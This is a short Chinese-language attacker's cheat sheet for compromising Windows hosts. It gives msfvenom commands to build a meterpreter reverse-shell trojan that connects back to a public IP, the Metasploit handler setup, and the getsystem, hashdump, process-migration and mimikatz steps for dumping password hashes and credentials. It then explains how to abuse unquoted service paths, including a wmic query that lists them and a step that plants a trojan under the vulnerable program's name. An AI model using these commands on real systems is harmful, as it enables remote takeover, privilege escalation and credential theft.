    过程我就不说了，大概思路就是msf生成一个exe木马反弹到公网主机
    然后最好是目标没有杀软（AV）先试试meterpreter自带的提权不行的话就换其他exp然后读hash
    破解hash就ok，如果读不出hash就进行进程迁移。
    
    具体如下
    1.msfvenom -p windows/meterpreter/reverse_tcp LHOST=公网ip LPORT=5200 -f exe -o msf.exe
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=公网ip LPORT=5200 -f exe -o x64.exe
    2.use exploit/multi/handler
      set payload windows/meterpreter/reverse_tcp
      set lport 5200
      set lhost 外网IP（nat关系看情况）
      exploit     
    3.shell（network service权限）执行 最好system权限执行
    4.getsystem —> getuid
    5.hashdump (如果不行则换进程)
      migrate pid —> hashdump
    6.load mimikatz  mimikatz_command -f samdump::hashes
      mimikatz_command -f sekurlsa::searchPasswords
    
    `无引号服务路径漏洞`
    从注册表中查看注册的服务，你会看到“ImagePath”的值是
    C:\Windows\system service\service.exe
    注册表中安全应为
    "C:\Windows\system service\service.exe"
    不安全的路径为
    C:\Windows\system service\service.exe
    当Windows尝试启动这个服务时，它会按照下面的顺序寻找可执行文件，并运行第一个找到的：
    C:/windows/ysx soft/x.exe 原注册表路径
    C:/windows/ysx.exe  CreateProcess函数读取结果
    
    查找命令
    运行下面的命令后，所有没有加双引号的服务将会被列出来
    wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows\\" |findstr /i /v """
    
    icacls x.exe  是否为EveryOne权限 “F”代表完全控制。“CI”代表从属容器将继承访问控制项。“OI”代表从属文件将继承访问控制项。
    
    如果是 则可以msf生成木马与存在漏洞的应用程序名称一致放在ysx目录下以管理员或系统权限启动这个应用
    
